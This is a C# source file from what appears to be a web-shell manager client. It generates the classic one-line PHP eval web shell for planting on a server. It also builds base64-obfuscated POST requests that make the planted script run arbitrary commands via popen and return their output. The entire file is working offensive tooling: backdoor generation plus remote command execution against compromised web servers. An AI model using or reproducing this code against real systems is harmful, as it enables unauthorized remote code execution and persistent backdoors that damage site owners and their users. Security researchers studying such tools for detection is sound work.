using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The universal one-liner PHP family: the placed script is the classic
/// <c>&lt;?php @eval($_POST[...]); ?&gt;</c> line -- the shape every
/// web-shell manager drives, which is why a script placed by hand or by
/// another tool answers this client too (the interop falls out of the
/// one-liner being universal, not from following anyone's product). Each
/// request builds its own wrapper -- the connection parameter carries
/// <c>@eval(@base64_decode($_POST['&lt;random&gt;']))</c>, the random
/// parameter carries the base64 payload, and the payload frames its answer
/// with the family's marker halves around a base64-encoded body.
///
/// The command runs through the standard, documented process functions --
/// a PATH setup for both OS families and a read pipe, the plain shape the
/// family's template uses. No function-fallback chains and no bypass
/// logic: those belong to out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class EvalPhpAdapter : EvalWebShellAdapterBase
{
    public override string Id => "eval-php";
    public override string ScriptLanguage => "php";

    protected override (string Prefix, string Suffix) PasswordLiteral => ("$_POST['", "']");

    public override string RenderScript(string password)
        => $"<?php @eval($_POST['{password}']); ?>";

    public override WebShellRequest EncodeCommand(
        string url,
        string password,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != "base64")
            throw new NotSupportedException($"The {Id} adapter implements the base64 encoder, not '{encoder}'.");
        if (decoder is not ("base64" or "default"))
            throw new NotSupportedException($"The {Id} adapter implements the base64 and default decoders, not '{decoder}'.");

        var tagStart = WebShellAdapters.RandomToken(6, 12);
        var tagEnd = WebShellAdapters.RandomToken(6, 12);
        var payloadVariable = WebShellAdapters.RandomToken(8, 14);
        var commandEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));

        // The command rides base64-encoded inside the payload, so no
        // quoting of the operator's text ever touches the PHP string.
        var payload =
            "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);"
            + $"$c=base64_decode('{commandEncoded}');"
            + "$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
            + "if(substr($d,0,1)==\"/\"){"
            + "@putenv(\"PATH=\".getenv(\"PATH\").\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\");"
            + "}else{"
            + "@putenv(\"PATH=\".getenv(\"PATH\").\";C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\\");"
            + "}"
            + "$p=@popen($c,\"r\");$o=\"\";"
            + "if($p){while(!@feof($p)){$o.=@fread($p,4096);}@pclose($p);}"
            + "echo \"" + Half(tagStart) + "\".\"" + HalfBack(tagStart) + "\";"
            + "echo @base64_encode($o);"
            + "echo \"" + Half(tagEnd) + "\".\"" + HalfBack(tagEnd) + "\";"
            + "die();";

        var form = new Dictionary<string, string>
        {
            [password] = $"@eval(@base64_decode($_POST['{payloadVariable}']));",
            [payloadVariable] = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)),
        };
        return new WebShellRequest(url, form, tagStart, tagEnd, password);
    }
}
